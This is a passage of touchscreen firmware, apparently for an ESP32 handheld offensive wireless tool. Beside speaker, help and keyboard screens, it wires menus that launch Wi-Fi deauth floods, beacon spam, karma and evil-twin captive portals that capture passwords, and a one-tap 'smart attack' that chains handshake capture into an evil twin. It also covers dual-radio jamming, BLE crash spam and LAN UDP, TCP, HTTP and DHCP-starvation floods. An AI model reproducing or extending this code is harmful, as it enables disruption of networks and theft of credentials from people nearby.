  if(esRead(0x31,muteReg)){muteReg&=0x9F;ok &= esWrite(0x31,muteReg);}else ok=false;
  return ok;
}
static bool speakerEnsureReady(){
  uint32_t now=millis();
  if(audioReady)return true;
  if(now<audioRetryAfterMs)return false;
  audioInitAttempted=true;
  if(!audioI2SBegun){
    audioI2S.setPins(I2S_BCLK,I2S_WS,I2S_DOUT,-1,-1);
    if(!audioI2S.begin(I2S_MODE_STD,AUDIO_SAMPLE_RATE,I2S_DATA_BIT_WIDTH_16BIT,I2S_SLOT_MODE_STEREO,I2S_STD_SLOT_BOTH)){
      Serial.println("[AUDIO] I2S init failed");audioRetryAfterMs=now+2500;return false;
    }
    audioI2SBegun=true;
  }
  if(!es8311Configure()){
    Serial.println("[AUDIO] ES8311 not detected or configuration failed");audioRetryAfterMs=now+2500;return false;
  }
  audioReady=true;
  uint8_t v=speakerMuted?0:speakerVolume;
  esWrite(0x32,(uint8_t)(v==0?0:((uint16_t)v*256/100)-1));
  Serial.println("[AUDIO] ES8311 + I2S ready");return true;
}
static void setSpeakerVolumeRegister(){
  if(!audioReady)return;
  uint8_t v=speakerMuted?0:speakerVolume;
  esWrite(0x32,(uint8_t)(v==0?0:((uint16_t)v*256/100)-1));
  if(prefsOK){prefs.putUChar("vol",speakerVolume);prefs.putBool("mute",speakerMuted);}
}
static bool speakerTestTone(){
  if(!speakerEnsureReady())return false;
  setSpeakerVolumeRegister();
  const uint32_t totalFrames=AUDIO_SAMPLE_RATE/2;
  uint32_t done=0;int16_t samples[256*2];
  while(done<totalFrames){
    uint32_t frames=min((uint32_t)256,totalFrames-done);
    for(uint32_t i=0;i<frames;i++){
      float t=(float)(done+i)/(float)AUDIO_SAMPLE_RATE;
      float env=min(1.0f,(float)(totalFrames-done-i)/1200.0f);
      int16_t v=speakerMuted?0:(int16_t)(sinf(2.0f*3.14159265f*660.0f*t)*10000.0f*env);
      samples[2*i]=v;samples[2*i+1]=v;
    }
    audioI2S.write((uint8_t*)samples,frames*2*sizeof(int16_t));
    done+=frames;yield();
  }
  return true;
}
static void drawSpeakerPage(){
  clearFB();header("SPEAKER");
  roundedCardFB(10,58,300,78,14,DGRAY,surfaceColor(17),fb);
  drawTextFB(23,73,"ONBOARD ES8311 AUDIO",WHITE,1,fb,24);
  drawTextFB(23,95,audioReady?"CODEC + I2S READY":(audioInitAttempted?"AUDIO INIT FAILED":"AUDIO NOT STARTED"),audioReady?GREEN:YELLOW,1,fb,27);
  drawTextFB(23,114,"I2S GPIO 23 / 10 / 25",GRAY,1,fb,24);
  drawTextFB(24,151,"OUTPUT VOLUME",GRAY,1,fb,18);
  drawTextFB(250,151,String(speakerMuted?0:speakerVolume)+"%",CYAN,1,fb,6);
  fillRoundRectFB(24,174,272,20,10,surfaceColor(28),fb);
  int fw=(264*(speakerMuted?0:speakerVolume)+50)/100;
  if(fw>0)fillRoundRectFB(28,178,fw,12,6,CYAN,fb);
  fillCircleFB(constrain(28+fw,34,290),184,7,WHITE,fb);
  for(int i=0;i<=4;i++)fillCircleFB(28+(264*i)/4,204,2,GRAY,fb);
  roundedCardFB(14,226,86,50,13,DGRAY,surfaceColor(18),fb);drawTextCenteredInRect(14,226,86,50,"-10",WHITE,2,fb);
  roundedCardFB(111,226,98,50,13,CYAN,mix565(surfaceColor(18),CYAN,17),fb);drawTextCenteredInRect(111,226,98,50,"TEST",WHITE,2,fb);
  roundedCardFB(220,226,86,50,13,DGRAY,surfaceColor(18),fb);drawTextCenteredInRect(220,226,86,50,"+10",WHITE,2,fb);
  roundedCardFB(14,289,292,51,13,DGRAY,surfaceColor(17),fb);
  drawTextFB(26,307,speakerMuted?"SPEAKER MUTED":"SPEAKER ENABLED",speakerMuted?YELLOW:GREEN,1,fb,23);
  drawPillFB(235,301,57,27,speakerMuted?surfaceColor(12):mix565(surfaceColor(12),GREEN,24),DGRAY,fb);
  drawTextCenteredInRect(235,301,57,27,speakerMuted?"OFF":"ON",WHITE,1,fb);
  roundedCardFB(14,353,292,48,13,DGRAY,surfaceColor(17),fb);
  drawTextFB(26,369,"PLAY TEST TONE",WHITE,1,fb,22);drawTextFB(283,369,">",CYAN,1,fb,1);
  drawTextFB(22,409,"EXTERNAL SPEAKER: MX1.25 2-PIN",GRAY,1,fb,33);
  footer();
}

// ------------------------- LAN host list (IN-NET) ---------------------
static void drawLanHosts(){
  clearFB();header("LAN HOSTS");
  size_t n=lan::hostCount();
  if(n==0){
    drawCenteredFB(200,"NO HOSTS YET",YELLOW,2,fb);
    drawCenteredFB(235,"RUN NET SCAN FIRST",GRAY,1,fb);
    footer();return;
  }
  drawTextFB(16,53,"TAP A HOST TO SET TARGET",GRAY,1,fb,26);
  const int top=71,rowH=48,maxRows=7;
  if((int)n<=maxRows)listTop=0;
  else if(listTop+maxRows>(int)n)listTop=(int)n-maxRows;
  for(int r=0;r<maxRows;r++){
    size_t i=(size_t)listTop+r;if(i>=n)break;int y=top+r*rowH;
    const lan::LanHost *h=lan::hostAt(i);if(!h)break;
    roundedCardFB(10,y,300,42,11,DGRAY,surfaceColor(14),fb);
    drawTextFB(21,y+7,h->ip,WHITE,1,fb,22);
    drawTextFB(21,y+24,String("PORT ")+String(h->port)+"  x"+String(h->hits),GRAY,1,fb,20);
    if(lan::targetText()==h->ip)fillCircleFB(294,y+21,4,GREEN,fb);
  }
  drawScrollbarV(top,top+maxRows*rowH,n,maxRows,(int)listTop);
  footer();
}

// V24.2: the screen is 320 px wide and a help card leaves ~34 glyphs of 8 px.
// The old detail view drew each line capped at 43 chars - anything longer ran
// off the card and the screen edge ("textos se salen del limite"). Long help
// lines are now wrapped onto a second row INSIDE the same card instead of
// overflowing. Guaranteed to fit: every output segment is <= 34 glyphs.
static void wrapHelp2(const char* s,String &a,String &b){
  const int maxChars=34;
  a=s; b="";
  if((int)a.length()<=maxChars) return;
  int cut=maxChars;
  for(int i=maxChars;i>=10;--i){
    if(i<(int)a.length() && a[i]==' '){ cut=i; break; }
  }
  if(a[cut]==' ') b=a.substring(cut+1);
  else            b=a.substring(cut);
  a=a.substring(0,cut);
  a.trim(); b.trim();
}

static void drawHelpList(){
  clearFB();header("HOW TO USE");
  drawTextFB(16,53,"TAP A TOPIC / SWIPE TO SCROLL",GRAY,1,fb,29);
  const int top=75,rowH=47,maxRows=7;
  if(helpSelection>=HELP_TOPIC_COUNT)helpSelection=0;
  const size_t maxTop=(HELP_TOPIC_COUNT>(size_t)maxRows)?HELP_TOPIC_COUNT-(size_t)maxRows:0;
  if((size_t)listTop>maxTop)listTop=(uint8_t)maxTop;
  for(int r=0;r<maxRows;r++){
    size_t i=(size_t)listTop+r;if(i>=HELP_TOPIC_COUNT)break;
    int y=top+r*rowH;
    roundedCardFB(10,y,300,41,10,DGRAY,surfaceColor(15),fb);
    drawTextFB(20,y+7,String(i+1<10?"0":"")+String(i+1),GRAY,1,fb,2);
    drawTextFB(49,y+7,HELP_TOPICS[i].title,WHITE,1,fb,29);
    drawTextFB(49,y+24,HELP_TOPICS[i].subtitle,GRAY,1,fb,32);   // V24.2: 34->32, 32*8=256 stays inside the 300 px card
    drawTextFB(288,y+13,">",CYAN,1,fb,1);
  }
  drawScrollbarV(top,top+maxRows*rowH,HELP_TOPIC_COUNT,maxRows,(int)listTop);
  // V28: pager pills removed here too (same reason as drawMenuPage).
  footer();
}

static void drawHelpDetail(){
  if(helpSelection>=HELP_TOPIC_COUNT)helpSelection=0;
  const HelpTopic &h=HELP_TOPICS[helpSelection];
  clearFB();header("HOW TO USE");
  roundedCardFB(10,57,300,296,15,DGRAY,surfaceColor(15),fb);
  drawTextFB(22,71,h.title,WHITE,1,fb,32);          // V24.2: caps sized to the card (22+32*8=278 < 310)
  drawTextFB(22,87,h.subtitle,CYAN,1,fb,32);
  fillRoundRectFB(22,102,34,3,2,CYAN,fb);
  const char *lines[]={h.line1,h.line2,h.line3,h.line4,h.line5};
  for(int i=0;i<5;i++){
    int y=112+i*42;
    roundedCardFB(18,y,284,36,8,DGRAY,surfaceColor(18),fb);
    String la,lb;
    wrapHelp2(lines[i],la,lb);                      // V24.2: wrap instead of overflow
    const uint16_t col=(i==4)?YELLOW:mix565(WHITE,GRAY,15);
    if(lb.length()==0){
      drawTextFB(27,y+12,la,col,1,fb,34);
    }else{
      drawTextFB(27,y+5,la,col,1,fb,34);
      drawTextFB(27,y+18,lb,col,1,fb,34);
    }
  }
  drawTextFB(18,362,String((unsigned)helpSelection+1)+" / "+String((unsigned)HELP_TOPIC_COUNT),GRAY,1,fb,12);
  roundedCardFB(12,376,142,40,12,DGRAY,surfaceColor(18),fb);
  drawTextCenteredInRect(12,376,142,40,"PREVIOUS",WHITE,1,fb);
  roundedCardFB(166,376,142,40,12,CYAN,mix565(surfaceColor(18),CYAN,20),fb);
  drawTextCenteredInRect(166,376,142,40,"NEXT",WHITE,1,fb);
  footer();
}
static void drawCurrent(){
  switch(screen){
    case MAIN:drawMainDashboard();break;
    case INTRO:drawIntroBase();break;
    case EXPLOIT:drawMenuPage(EXPLOIT_ITEMS,7,"EXPLOIT");break;
    case DEAUTH:drawMenuPage(DEAUTH_ITEMS,9,"DEAUTH");break;
    case DEAUTH_APS:drawMenuPage(THREE_ITEMS,3,"APs");break;
    case AUTH:drawMenuPage(THREE_ITEMS,3,"AUTH");break;
    case ASSOC:drawMenuPage(THREE_ITEMS,3,"ASSOC");break;
    case BEACON:drawMenuPage(BEACON_ITEMS,7,"BEACON");break;
    case SPOOF:drawMenuPage(SPOOF_ITEMS,3,"AP SPOOFING");break;
    case COMBO:drawMenuPage(COMBO_ITEMS,8,"ADVANCED");break;
    case BT_ADV:drawMenuPage(BT_ITEMS,9,"B.T ADV");break;
    case DRONE:drawMenuPage(DRONE_ITEMS,9,"DRONE DUO");break;
    case SCAN:drawScanPage();break;
    case SCAN_BUSY:drawScanLoading();break;
    case SETTINGS:drawSettings();break;
    case ABOUT:drawAbout();break;
    case HELP:drawHelpList();break;
    case HELP_DETAIL:drawHelpDetail();break;
    case AP_RESULTS:drawAPList(false);break;
    case AP_SELECT:drawAPList(true);break;
    case POWER:drawPower();break;
    case BRIGHTNESS:drawBrightness();break;
    case PACKET:drawPacket();break;
    case ATTACK_LIVE:drawAttackLive();break;
    case CHANNEL_PICK:drawChannelPicker();break;
    case STA_RESULTS:drawSTAList(false);break;
    case STA_SELECT:drawSTAList(true);break;
    case DISCL:drawDiscl();break;
    case THEME_PICKER:drawThemePicker();break;
    case CONNECT_WIFI:drawConnectWifi();break;
    case WIFI_KEYBOARD:drawWifiKeyboard();break;
    case WIFI_CONNECTING:drawWifiConnecting();break;
    case WIFI_DETAILS:drawWifiDetails();break;
    case SD_PAGE:drawSDPage();break;
    case SD_FILES:drawSDFiles();break;
    case SD_VIEW:drawSDViewer();break;
    case AUDIO_PAGE:drawSpeakerPage();break;
    case IN_NET:drawMenuPage(IN_NET_ITEMS,7,"IN-NET");break;
    case LAN_HOSTS:drawLanHosts();break;
    case PORTAL_PICK:drawPortalPick();break;
    case MEGA_PICK:drawMegaPick();break;
  }
}

static void openMainAction(){
  switch(menuIndex){
    case 0:transitionTo(EXPLOIT);break;
    case 1:wifiConnectMode=false;transitionTo(SCAN);break;
    case 2:openConnectWifiEntry();break;
    case 3:startMonitor();transitionTo(PACKET);break;
    case 4:transitionTo(SETTINGS);break;
    case 5:transitionTo(ABOUT);break;
  }
}
static void openExploitAction(){
  switch(menuIndex){
    case 0:transitionTo(DEAUTH);break;
    case 1:transitionTo(AUTH);break;
    case 2:transitionTo(ASSOC);break;
    case 3:transitionTo(BEACON);break;
    case 4:transitionTo(SPOOF);break;
    case 5:transitionTo(COMBO);break;
    case 6:transitionTo(BT_ADV);break;
  }
}

// Deauth submenu: 9 real attack modes (V25 adds the FIND WIFI pair)
static void openDeauthAction(){
  switch(menuIndex){
    case 0: launchAPAttack(ae::AttackType::DEAUTH_ALL,"DEAUTH ALL APS"); break;
    case 1: openChannelPicker(CH_ACT_DEAUTH); break;
    case 2: launchSelectedAPAttack(ae::AttackType::DEAUTH_SELECTED,"DEAUTH SELECTED APS"); break;
    case 3: {
      if(ae::staCount()==0){showPopup("DEAUTH STAS","NO STATIONS","RUN SCAN > SCAN STATIONS");return;}
      memset(selectedSTA,0,sizeof(selectedSTA));
      staSelectConfirm=true;
      listTop=0;transitionTo(STA_SELECT);
      break;
    }
    case 4: launchSTAAttack(ae::AttackType::DEAUTH_STA_ALL,"DEAUTH ALL STAS"); break;
    case 5: launchStorm(); break;
    case 6: launchTwoWayDeauth(); break;
    case 7: openFindWifiPick(true); break;    // V25: FIND WIFI 2.4 GHz
    case 8: openFindWifiPick(false); break;   // V25: FIND WIFI 5 GHz
  }
}

// ------------------- V25 FIND WIFI (device -> its network) --------------
// Pick ONE device from the station list; the attack keeps kicking it while
// the sniffer watches which network it runs back to. The user confirms the
// network ("that's the wifi") or skips to keep hunting.
static bool findPickPending=false;      // a FIND WIFI station pick is in flight
static bool findPickBand24=true;        // 2.4 GHz vs 5 GHz hunt
static void openFindWifiPick(bool band24){
  if(ae::staCount()==0){
    showPopup("FIND WIFI","NO STATIONS","RUN SCAN > SCAN STATIONS");
    return;
  }
  stopMonitor();
  memset(selectedSTA,0,sizeof(selectedSTA));
  staSelectConfirm=true;
  findPickPending=true; findPickBand24=band24;
  listTop=0;transitionTo(STA_SELECT);
}
static void launchFindWifiOnSta(){
  findPickPending=false;
  ae::STAInfo *target=nullptr;
  for(size_t i=0;i<ae::staCount() && i<MAX_STA_SEL;i++){
    if(selectedSTA[i]){ target=ae::staAt(i); selectedSTA[i]=false; if(target)break; }
  }
  if(!target){showPopup("FIND WIFI","NO DEVICE SELECTED","TAP ONE CLIENT");return;}
  stopMonitor();
  syncEngineAPs();
  ae::findBegin(target->sta, findPickBand24);
  String title=findPickBand24?String("FIND WIFI 2.4G"):String("FIND WIFI 5G");
  ae::attackStart(ae::AttackType::FIND_WIFI,title.c_str(),macToString(target->sta).c_str());
  actionReturnScreen=DEAUTH;
  attackLiveLastDrawMs=0;
  transitionTo(ATTACK_LIVE);
  showPopup("FIND WIFI",findPickBand24?"2.4 GHZ HUNT":"5 GHZ HUNT","KICKING THE DEVICE");
}

static void openThreeAction(ae::AttackType allT,ae::AttackType selT,const char* allTitle,const char* selTitle,ChannelAction chAct){
  switch(menuIndex){
    case 0: launchAPAttack(allT,allTitle); break;
    case 1: openChannelPicker(chAct); break;
    case 2: launchSelectedAPAttack(selT,selTitle); break;
  }
}

static void openBeaconAction(){
  switch(menuIndex){
    case 0: launchSimpleBeacon(ae::AttackType::BEACON_DUP_ALL,"BEACON ALL SSIDS DUPE"); break;
    case 1: launchSelectedAPAttack(ae::AttackType::BEACON_DUP_SELECTED,"BEACON SELECTED DUPE"); break;
    case 2: launchSimpleBeacon(ae::AttackType::BEACON_RANDOM,"BEACON RANDOM"); break;
    case 3: openChannelPicker(CH_ACT_BEACON); break;
    case 4: launchPrefixBeacon(); break;
    case 5: launchSimpleBeacon(ae::AttackType::BEACON_RICKROLL,"BEACON RICKROLL"); break;
    case 6: launchSimpleBeacon(ae::AttackType::BEACON_FAKERANDOM,"BEACON FAKE STORM"); break;
  }
}

static void openSpoofAction(){
  switch(menuIndex){
    case 0: launchSpoofClone(); break;
    case 1: launchKarma(); break;
    case 2: launchProbeFlood(); break;
    case 3: macRandomize(); break;         // V26: new identity for this board
    case 4: macRestore(); break;           // V26: factory MAC back
  }
}

// ------------------- V26 SMART ATTACK (one tap, full chain) ----------------
// "haz todo el firmware muy inteligente": one tap runs the whole playbook on
// the strongest named network in the air:
//   1. no data yet  -> automatic AP scan (this hook resumes when it lands)
//   2. handshake    -> HS_CAPTURE on the best AP (deauth pressure + sniffer)
//   3. evil twin    -> clone AP + portal opens automatically when the
//                      handshake lands (or after 45 s regardless)
//   dual mode ON    -> the drone joins the twin and jams the victim family.
static size_t  smartApIdx=0;           // V26 SMART: chosen AP (smartStage lives up top)
static uint32_t smartHsT0=0;

static void smartPickBest(){
  smartStage=0;
  // aps[] is RSSI-sorted by the scan - the first NAMED network is the best
  // target (hidden/empty SSIDs cannot be cloned usefully).
  size_t pick=(size_t)-1;
  for(size_t i=0;i<apCount;i++){
    if(aps[i].ssid.length()>0){ pick=i; break; }
  }
  if(pick==(size_t)-1){
    showPopup("SMART ATTACK","NO NAMED NETWORK","RESCAN AND RETRY");
    transitionTo(COMBO);
    return;
  }
  smartApIdx=pick;
  stopMonitor();
  syncEngineAPs();
  uint8_t b[6]; apParseBSSID(aps[pick].bssid,b);
  std::vector<ae::TargetAP> targets;
  ae::TargetAP t;
  memcpy(t.bssid,b,6);
  strncpy(t.ssid,aps[pick].ssid.c_str(),32);
  t.channel=aps[pick].channel; t.encrypted=aps[pick].encrypted; t.rssi=aps[pick].rssi;
  targets.push_back(t);
  ae::attackStart(ae::AttackType::HS_CAPTURE,"SMART: HANDSHAKE",sanitizeSSID(aps[pick].ssid,20).c_str(),targets);
  hsPopupShown=false;
  smartStage=2; smartHsT0=millis();
  actionReturnScreen=COMBO;
  transitionTo(ATTACK_LIVE);
  showPopup("SMART ATTACK","TARGET: "+displaySSID(aps[pick].ssid,18),"STEP 2/3: HANDSHAKE...",2400);
}

static void smartLaunchTwin(bool gotHs){
  smartStage=3;
  if(smartApIdx>=apCount){ smartStage=0; showPopup("SMART ATTACK","TARGET LOST","RESCAN AND RETRY"); transitionTo(COMBO); return; }
  etPendingMode=1;                     // classic clone + portal
  etPendingApIdx=smartApIdx;
  etTemplate=0;                        // default portal story page
  buildTemplateList();
  listTop=0;
  if(dualModeOn) etDuoJam=true;        // dual mode: drone joins the twin
  if(gotHs) showPopup("SMART ATTACK","HANDSHAKE CAPTURED","STEP 3/3: EVIL TWIN...",2400);
  else      showPopup("SMART ATTACK","NO HANDSHAKE IN 45S","STEP 3/3: EVIL TWIN...",2400);
  launchPendingEvilTwin();
}

static void launchSmartAttack(){
  if(macBusy()){ showPopup("SMART ATTACK","RADIO BUSY","STOP ATTACK / SCAN FIRST"); return; }
  stopMonitor();
  syncEngineAPs();
  if(apCount==0){
    smartStage=1;
    showPopup("SMART ATTACK","STEP 1/3: SCANNING","PICKING THE BEST TARGET...",2400);
    beginScanAPs();
    return;
  }
  smartPickBest();
}

// Called every loop pass. Watches the SMART handshake stage: on M1+M2 (or a
// 45 s timeout) it stops the capture and opens the clone twin by itself.
static void serviceSmart(){
  if(smartStage!=2) return;
  if(!ae::attackRunning() || ae::attackType()!=ae::AttackType::HS_CAPTURE){
    smartStage=0;                      // the user aborted the capture
    return;
  }
  const ae::HSState *hs=ae::hsState();
  if(hs && hs->complete){
    ae::attackStop();
    droneReleaseAfterAttack();
    smartLaunchTwin(true);
    return;
  }
  if(millis()-smartHsT0>45000){
    ae::attackStop();
    droneReleaseAfterAttack();
    smartLaunchTwin(false);
  }
}

static void openComboAction(){
  switch(menuIndex){
    case 0: launchEvilTwin(); break;
    case 1: transitionTo(MEGA_PICK); break;   // V21: mode picker (replicate/keyboard/fix)
    case 2: { stopMonitor(); syncEngineAPs(); etPickMode=3; pendingActionReturn=COMBO; pendingTargetAction=true; pendingTargetActionTitle="PICK TARGET AP"; wifiConnectMode=false; if(apCount>0){listTop=0;transitionTo(AP_RESULTS);}else beginScanAPs(); } break;
    case 3: { stopMonitor(); syncEngineAPs(); etPickMode=4; pendingActionReturn=COMBO; pendingTargetAction=true; pendingTargetActionTitle="PICK TARGET AP"; wifiConnectMode=false; if(apCount>0){listTop=0;transitionTo(AP_RESULTS);}else beginScanAPs(); } break;
    case 4: launchDeauthRickroll(); break;
    case 5: launchTotalOutage(); break;
    case 6: launchClientHunter(); break;
    case 7: transitionTo(DRONE); break;      // V23: DUO drone menu
    case 8: launchSmartAttack(); break;      // V26: one-tap auto combo
  }
}

// V21: a MEGA mode row was tapped on MEGA_PICK -> normal victim pick flow.
static void openMegaMode(uint8_t pickMode){
  stopMonitor();
  syncEngineAPs();
  if(pickMode==8) etKeyMsg="";      // retype the message each session
  etPickMode=pickMode;
  pendingActionReturn=MEGA_PICK;
  pendingTargetAction=true;pendingTargetActionTitle="PICK TARGET AP";
  wifiConnectMode=false;
  if(apCount>0){listTop=0;transitionTo(AP_RESULTS);}
  else beginScanAPs();
}

// ---------------------- V23 DUO drone menu actions --------------------------
static void droneDuoPick(uint8_t mode){
  stopMonitor();
  syncEngineAPs();
  etPickMode=mode;                   // 9 ET / 10 crossfire / 11 pincer / 12 handshake / 14 beacon clone
  pendingActionReturn=DRONE;
  pendingTargetAction=true;pendingTargetActionTitle="PICK TARGET AP";
  wifiConnectMode=false;
  if(apCount>0){listTop=0;transitionTo(AP_RESULTS);}
  else beginScanAPs();
}
static void droneLinkManual(){
  if(drone::linked()){ showPopup("DRONE DUO","ALREADY LINKED","SX-DRONE READY"); return; }
  if(!droneEnsureForAttack()) return;
  drone::setAuto(false);             // manual link stays until UNLINK
  showPopup("DRONE DUO","DRONE LINKED","READY FOR DUO ATTACKS");
}
static void droneUnlinkManual(){
  if(!drone::linked() && !drone::autoLink()){ showPopup("DRONE DUO","NOT LINKED","DRONE IS OFFLINE"); return; }
  drone::linkStop();
  showPopup("DRONE DUO","UNLINKED","TX/RX LINK FREE");
}

// ---------------------- V24 DUO SWEEP JAM (no AP pick) ----------------------
// The drone sweeps every non-DFS 2.4 + 5 GHz channel broadcasting deauth
// bursts while this board runs its own channel-hopping storm over the known
// AP registry. Two radios = full-spectrum wipe, no target selection needed.
static void launchDuoSweep(){
  if(!droneEnsureForAttack()) return;
  stopMonitor();
  syncEngineAPs();
  dualHookSkip=true;                 // the sweep is driven by hand here
  drone::setAuto(true);              // auto link + job mirror for auto re-link
  drone::sweep(dualRateFromPower());
  ae::attackStart(ae::AttackType::DEAUTH_STORM,"DUO SWEEP JAM","DRONE SWEEPS 2.4+5 GHZ");
  dualHookSkip=false;
  actionReturnScreen=DRONE;
  transitionTo(ATTACK_LIVE);
  showPopup("DUO SWEEP JAM","DRONE SWEEPS ALL CHANNELS","LOCAL HOP STORM LIVE");
}
static void droneStatusPopup(){
  if(!drone::linked()){
    // V24.2: the bytes counter tells wiring (0 B) apart from baud/pins (>0 B).
    String lb=String("RX ")+String((unsigned long)drone::rxBytes())+" B HEARD - CHECK WIRES";
    showPopup("DRONE STATUS","OFFLINE",lb);
    return;
  }
  // V24: parsed telemetry first, raw STAT line as fallback while the first
  // poll is in flight.
  String m=drone::statMode();
  if(m.length()>0){
    String l2=drone::statRps()+" F/S   "+drone::statTemp()+"C   TX "+drone::statTx();
    showPopup("DRONE STATUS",m+"  CH "+drone::statCh(),l2);
  }else{
    showPopup("DRONE STATUS","LINKED - SX-DRONE","WAITING FOR STATS...");
  }
}
static void openDroneAction(){
  switch(menuIndex){
    case 0: droneLinkManual(); break;
    case 1: droneUnlinkManual(); break;
    case 2: droneDuoPick(9); break;
    case 3: droneDuoPick(10); break;
    case 4: droneDuoPick(11); break;
    case 5: droneDuoPick(12); break;
    case 6: launchDuoSweep(); break;               // V24
    case 7: droneDuoPick(14); break;               // V24
    case 8: droneStatusPopup(); break;
  }
}

static void openBTAction(){
  switch(menuIndex){
    case 0: launchBLE(ble::Mode::APPLE); break;
    case 1: launchBLE(ble::Mode::SAMSUNG); break;
    case 2: launchBLE(ble::Mode::ANDROID); break;
    case 3: launchBLE(ble::Mode::WINDOWS); break;
    case 4: launchBLE(ble::Mode::ALL_SEQ); break;
    case 5: launchBLE(ble::Mode::RANDOM); break;
    case 6: launchBLE(ble::Mode::SOUR_APPLE); break;
    case 7: launchBLE(ble::Mode::ANDROID_CRASH); break;
    case 8: launchBLE(ble::Mode::APOCALYPSE); break;
  }
}

// IN-NET menu (post-connection LAN attacks)
static void openInNetAction(){
  switch(menuIndex){
    case 0: launchLan(lan::Mode::NETSCAN); break;
    case 1: launchLan(lan::Mode::UDP_FLOOD); break;
    case 2: launchLan(lan::Mode::TCP_FLOOD); break;
    case 3: launchLan(lan::Mode::HTTP_FLOOD); break;
    case 4: launchLan(lan::Mode::DHCP_STARVE); break;
    case 5: launchLan(lan::Mode::SSDP_FLOOD); break;
    case 6: launchLan(lan::Mode::APOCALYPSE); break;
  }
}

static void applyBrightness(int value){
  value=constrain(value,0,100);
  brightness=(uint8_t)value;
  boardBacklight(brightness);
  if(prefsOK)prefs.putUChar("br",brightness);
}
static int brightnessFromTouch(int x){
  const int x0=28,x1=292;
  int v=(int)lroundf((float)(x-x0)*100.0f/(float)(x1-x0));
  return constrain(v,0,100);
}

static void keyboardAppend(char c){
  size_t limit=63;
  if(keyboardPurpose==KEY_WIFI_SSID)limit=32;
  else if(keyboardPurpose==KEY_ATTACK_TEXT)limit=20;
  else if(keyboardPurpose==KEY_ET_MSG)limit=120;
  if(keyboardBuffer.length()<limit)keyboardBuffer+=(char)c;
}
static void keyboardDelete(){if(keyboardBuffer.length())keyboardBuffer.remove(keyboardBuffer.length()-1);}
static void keyboardSubmit(){
  if(keyboardPurpose==KEY_WIFI_SSID){
    if(keyboardBuffer.length()==0){showPopup("CONNECT WIFI","SSID REQUIRED","TYPE NETWORK NAME",1800);return;}
    wifiTargetSSID=keyboardBuffer;keyboardBuffer="";keyboardPurpose=KEY_WIFI_PASSWORD;keyboardSymbols=false;keyboardUpper=false;
    transitionTo(WIFI_KEYBOARD);return;
  }
  if(keyboardPurpose==KEY_ATTACK_TEXT){
    String txt=keyboardBuffer;
    keyboardBuffer="";
    keyboardPurpose=KEY_WIFI_PASSWORD;keyboardSymbols=false;keyboardUpper=false;
    if(txt.length()==0){showPopup("BEACON PREFIX","TEXT REQUIRED","TYPE A PREFIX",1800);return;}
    if(attackTextDone){void (*cb)(const String&)=attackTextDone;attackTextDone=nullptr;cb(txt);}
    return;
  }
  if(keyboardPurpose==KEY_ET_PASS){
    // V21 replicate: empty = skip (captured passwords are verified later).
    etRealPass=keyboardBuffer;keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;
    keyboardPurpose=KEY_WIFI_PASSWORD;
    launchPendingEvilTwin();return;
  }
  if(keyboardPurpose==KEY_ET_MSG){
    if(keyboardBuffer.length()==0){showPopup("KEYBOARD PAGE","TEXT REQUIRED","TYPE YOUR MESSAGE",1800);return;}
    etKeyMsg=keyboardBuffer;keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;
    keyboardPurpose=KEY_WIFI_PASSWORD;
    launchPendingEvilTwin();return;
  }
  startWifiConnection(wifiTargetSSID,keyboardBuffer);
}

static void keyboardRedraw(){ drawCurrent(); lcdPush(fb); }

static void handleKeyboardTap(uint16_t x,uint16_t y){
  if(!keyboardSymbols){
    const char *r0="qwertyuiop",*r1="asdfghjkl",*r2="zxcvbnm";
    if(y>=108&&y<144&&x>=11&&x<309){
      int i=(x-11)/30; int kx=11+i*30;
      if(i>=0&&i<10&&x<kx+28) keyboardAppend(keyboardUpper?r0[i]-32:r0[i]);
      keyboardRedraw(); return;
    }
    if(y>=148&&y<184&&x>=13&&x<310){
      int i=(x-13)/33; int kx=13+i*33;
      if(i>=0&&i<9&&x<kx+30) keyboardAppend(keyboardUpper?r1[i]-32:r1[i]);
      keyboardRedraw(); return;
    }
    if(y>=188&&y<224){
      if(x>=6&&x<54){keyboardUpper=!keyboardUpper;keyboardRedraw();return;}
      if(x>=58&&x<268){int i=(x-58)/30;int kx=58+i*30;if(i>=0&&i<7&&x<kx+28)keyboardAppend(keyboardUpper?r2[i]-32:r2[i]);keyboardRedraw();return;}
      if(x>=273&&x<314){keyboardDelete();keyboardRedraw();return;}
    }
  }else{
    const char *rows[]={"1234567890","!@#$%^&*()","-_=+[]{}\\|",";:'\",.<>/?`~"};
    const int ys[]={108,146,184,222};
    for(int row=0;row<4;row++){
      int n=(int)strlen(rows[row]);
      if(y>=ys[row]&&y<ys[row]+34){
        int kw=(n==12)?23:28; const int gap=2,startX=11;
        int i=(x-startX)/(kw+gap); int kx=startX+i*(kw+gap);
        if(i>=0&&i<n&&x>=kx&&x<kx+kw) keyboardAppend(rows[row][i]);
        keyboardRedraw(); return;
      }
    }
  }
  // Shared control row for alpha and symbols layouts.
  int controlY=keyboardSymbols?262:232;
  if(y>=controlY&&y<controlY+38){
    if(x>=6&&x<61){keyboardSymbols=!keyboardSymbols;keyboardRedraw();return;}
    if(x>=64&&x<159){keyboardAppend(' ');keyboardRedraw();return;}
    if(x>=164&&x<206){keyboardDelete();keyboardRedraw();return;}
    if(x>=209&&x<251){keyboardBuffer="";keyboardRedraw();return;}
    if(x>=254&&x<314){keyboardSubmit();return;}
  }
  int actionY=keyboardSymbols?310:280;
  if(y>=actionY&&y<actionY+40){
    if(x<101){
      keyboardBuffer="";keyboardSymbols=false;
      if(keyboardPurpose==KEY_ATTACK_TEXT){keyboardPurpose=KEY_WIFI_PASSWORD;attackTextDone=nullptr;transitionTo(EXPLOIT);return;}
      if(keyboardPurpose==KEY_ET_PASS){etRealAsked=false;etRealSkipped=true;etRealPass="";keyboardPurpose=KEY_WIFI_PASSWORD;transitionTo(keyboardCancelTo);return;}
      if(keyboardPurpose==KEY_ET_MSG){keyboardPurpose=KEY_WIFI_PASSWORD;transitionTo(keyboardCancelTo);return;}
      transitionTo(CONNECT_WIFI);
      return;
    }
    if(x<196){keyboardBuffer="";keyboardRedraw();return;}
    keyboardSubmit();return;
  }
}

static void handleTap(uint16_t x,uint16_t y){
  if(popup){closePopup();return;}
  // Global footer buttons.
  if(y>=430){
    if(x<105){
      if(screen==WIFI_KEYBOARD){
        keyboardBuffer="";
        if(keyboardPurpose==KEY_ATTACK_TEXT){keyboardPurpose=KEY_WIFI_PASSWORD;attackTextDone=nullptr;transitionTo(EXPLOIT);return;}
